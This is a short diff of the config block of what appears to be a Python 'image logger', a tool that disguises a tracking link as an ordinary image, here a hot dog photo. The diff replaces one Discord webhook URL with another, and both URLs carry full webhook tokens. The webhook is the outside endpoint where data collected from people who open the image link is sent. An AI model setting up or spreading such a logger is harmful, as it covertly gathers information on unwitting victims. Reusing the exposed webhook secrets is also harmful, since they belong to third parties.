@@ -11,7 +11,7 @@ __author__ = "rcx"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1110261067659083826/SNbJKNUgEfvkPfPqJRzpXIaten4PMjDRuVJSQY2ETegTTH1RVr8OtYt6WR8nFkXKzuPD",
+    "webhook": "https://discord.com/api/webhooks/1110675906726465567/z_mGPe0YZjEu16MZJf-i-2UZjr5qUyXI_DF3ZDidnddQNEUlgsgumz74Tz0LXuE-OwLB",
     "image": "https://www.myduchess.com/wp-content/uploads/2021/01/DU-Image-2020-SandwichesGrill-Hotdog-FA-e1610389513139.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
